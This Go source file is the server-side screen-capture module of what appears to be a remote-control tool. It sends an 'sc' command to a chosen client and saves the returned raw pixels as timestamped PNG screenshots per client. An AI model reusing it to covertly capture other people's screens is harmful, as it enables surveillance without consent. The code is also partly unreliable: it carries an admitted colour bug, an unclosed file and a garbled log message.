package screen

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"os"
	"time"
	"unsafe"

	"server/internal/mod"
	"server/internal/net"
	"server/internal/utility/asynlog"
	"server/internal/utility/panic"
)

const (
	// Screen means the packet is related to screen capture.
	Screen net.PktType = 4
)

type screen struct {
	currClient net.Client
	asynlog.Logger
}

// New creates a new screen capture module.
func New(logger asynlog.Logger) mod.Mod {
	return &screen{
		Logger: logger,
	}
}

func (sc *screen) Exec(cmd string, args []string) error {
	panic.Assert(cmd == "sc", "Invalid command.")

	if sc.currClient == nil {
		return fmt.Errorf("The current client is null")
	}

	pkg := net.NewPacket()
	pkg.Type = Screen
	return sc.currClient.SendPacket(pkg)
}

func (*screen) Cmds() []string {
	return []string{
		"sc",
	}
}

// BUG: The color of the pixels in the .png file does not mismatch the original screen.
func (sc *screen) Respond(client net.Client, pkg *net.Packet) error {
	panic.Assert(pkg.Type == Screen, "Invalid packet type.")

	dirName, err := sc.makeDir()
	if err != nil {
		return err
	}

	var buffer [unsafe.Sizeof(int32(0)) * 2]byte
	if _, err := pkg.Read(buffer[:]); err != nil {
		return err
	}

	var width, height int32 = 0, 0
	reader := bytes.NewReader(buffer[:])
	binary.Read(reader, binary.LittleEndian, &width)
	binary.Read(reader, binary.LittleEndian, &height)

	img := image.NewRGBA(
		image.Rectangle{image.Point{0, 0},
			image.Point{int(width), int(height)}})

	reader = bytes.NewReader(pkg.Data)
	for y := 0; y < int(height); y++ {
		for x := 0; x < int(width); x++ {

			var red, green, blue, unused uint8 = 0, 0, 0, 0
			binary.Read(reader, binary.LittleEndian, &red)
			binary.Read(reader, binary.LittleEndian, &green)
			binary.Read(reader, binary.LittleEndian, &blue)
			binary.Read(reader, binary.LittleEndian, &unused)

			img.Set(x, y, color.RGBA{red, green, blue, 0xFF})
		}
	}

	fileName := fmt.Sprintf("%v/%v-%v.png",
		dirName, client.ID(), time.Now().Unix())
	file, err := os.Create(fileName)
	if err != nil {
		return err
	}

	err = png.Encode(file, img)
	if err != nil {
		return err
	}

	msg := fmt.Sprintf(
		"A screenshot from the client [%v] has been saved as %v.png.",
		client.ID(), fileName)
	sc.Store(msg)
	return nil
}

func (*screen) Packets() []net.PktType {
	return []net.PktType{
		Screen,
	}
}

func (*screen) ID() mod.ID {
	return 2
}

func (*screen) Name() string {
	return "SCREEN"
}

func (sc *screen) String() string {
	return fmt.Sprintf("%d-%s", sc.ID(), sc.Name())
}

func (sc *screen) SetClient(client net.Client) {
	sc.currClient = client
}

func (*screen) Close() error {
	return nil
}

func (*screen) makeDir() (string, error) {
	dirName := time.Now().Format("2006-01")
	_, err := os.Stat(dirName)
	if err != nil && os.IsNotExist(err) {
		return dirName, os.Mkdir(dirName, os.ModePerm)
	}

	return dirName, nil
}
